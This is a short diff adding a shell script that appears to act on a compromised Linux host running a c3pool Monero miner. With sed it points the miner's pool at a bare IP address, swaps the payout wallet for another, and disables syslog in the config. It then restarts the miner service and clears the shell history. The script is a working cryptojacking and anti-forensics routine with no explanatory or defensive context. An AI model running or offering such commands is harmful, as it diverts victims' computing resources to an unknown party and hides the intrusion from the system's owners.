@@ -1,0 +1,5 @@
+sed -i 's/mine.c3pool.com/8.214.124.214/g' /etc/c3pool/config.json
+sed -i 's/87zFHYLAjuZKnfapXyUazz7mYZLnhAf464m17BCs1VLjNkNN4qLiFvq4n7et7qjsWzgKvN4FGZLk8bLF5eGSngxFFHwGB7D/84V4P5TsdZcJpswKRHNk7Mf6KLx9aBxZUjVDrHxQ2aeSirvPAnAvZkoWxTDkRjkmn6i7Wz4soyzLjZLxPX6nas9dVq71rWh/g' /etc/c3pool/config.json
+sed -i 's/"syslog": [^,]*/"syslog": false/' /etc/c3pool/config.json
+systemctl restart c3pool_miner.service
+history -c
